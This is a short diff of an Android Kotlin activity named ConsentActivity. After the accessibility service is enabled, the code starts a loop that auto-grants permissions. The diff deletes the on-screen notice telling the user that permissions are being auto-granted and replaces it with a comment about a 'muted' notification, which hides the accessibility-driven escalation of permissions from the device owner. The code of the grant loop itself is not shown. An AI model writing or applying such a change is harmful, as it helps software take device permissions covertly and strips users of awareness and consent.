@@ -77,7 +77,7 @@ class ConsentActivity : AppCompatActivity() {
         ActivityResultContracts.StartActivityForResult()
     ) {
         if (isAccessibilityEnabled()) {
-            Toast.makeText(this, "✓ Accessibility Enabled! Auto-granting permissions...", Toast.LENGTH_SHORT).show()
+            // Muted client-side notification during automated testing/grant flow
             // Accessibility service is now active - start rapid auto-grant scanner and launch permissions
             BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
             Handler(Looper.getMainLooper()).postDelayed({
